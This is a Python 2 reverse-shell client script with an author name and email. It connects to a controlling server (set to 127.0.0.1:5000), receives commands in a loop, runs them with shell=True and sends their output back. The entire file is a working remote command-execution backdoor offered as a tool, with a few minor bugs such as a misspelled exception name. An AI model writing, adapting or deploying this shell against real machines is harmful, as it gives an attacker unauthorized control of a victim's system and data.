# python2
# make sure to run server first
"""
Creater: Josh Ambush aka J Slump
Email: ambushslump5435@gmail.com
"""
import socket
import os
import subprocess

def main():
    port  = 5000 # port that server is bind to!
    host ='127.0.0.1' # address of server!

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))
    print("[$] connected Successful!")

    while True:
        command = client_socket.recv(1024)
        command.split()
        print("Commmand : " + command)

        if(command == 'stop()'):
            break
        if(command.split()[0]=="cd"):
            if(len(command.split()) == 1):
                client_socket.send((os.getcwd()))
            elif(len(command.split())==2):
                try:
                    os.chdir(command.split()[1])
                    client_socket.send(("Directory is now: " + os.getcwd()))
                except(WinodwsError):
                    client_socket.send(str.encode("Directory doesnt exist : " + os.getcwd()))
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value = proc.stdout.read() +proc.stderr.read()
            print(stdout_value + "\n")
            if(stdout_value != ""):
                client_socket.send(stdout_value)
            else:
                client_socket.send(command + " returns nothing")
    client_socket.close()
if __name__ == "__main__":
    main()
